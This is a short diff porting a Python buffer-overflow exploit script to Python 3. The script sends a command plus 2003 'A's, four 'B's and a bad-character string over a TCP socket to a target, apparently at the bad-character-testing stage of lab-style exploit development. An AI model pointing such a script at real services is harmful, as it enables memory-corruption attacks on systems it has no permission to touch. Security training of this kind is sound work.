@@ -1,4 +1,4 @@
-#!/usr/bin/python
+#!/usr/bin/python3
 import sys, socket
 
 ip = ''
@@ -27,7 +27,10 @@ shellcode = "A" * 2003 + "B" * 4 + badchars
 try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((ip,port))
-        s.send((command + shellcode))
+        
+        payload = command + shellcode
+
+        s.send((payload.encode()))
         s.close()
 
 except:
